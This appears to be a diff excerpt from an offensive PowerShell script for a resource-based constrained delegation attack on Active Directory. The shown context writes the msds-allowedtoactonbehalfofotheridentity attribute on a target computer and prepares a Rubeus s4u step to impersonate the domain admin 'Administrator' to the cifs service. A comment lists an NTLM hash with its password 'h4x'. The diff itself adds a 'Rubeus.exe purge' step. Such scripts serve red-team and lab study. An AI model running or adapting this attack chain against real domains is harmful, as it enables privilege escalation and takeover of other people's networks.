@@ -49,6 +49,10 @@ Write-Host "[+] Set the msds-allowedtoactonbehalfofotheridentity property"
 Get-DomainComputer $Target | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
 
 $fqdn = -join($Target,".",$Domain)
+
+# purge existing tickets with rubeus
+.\Rubeus.exe purge
+
 # execute Rubeus' s4u process against $TargetComputer
 #   AA6EAFB522589934A6E5CE92C6438221 == 'h4x'
 #   impersonating "Administrator" (a DA) to the cifs sname for the target computer (primary)
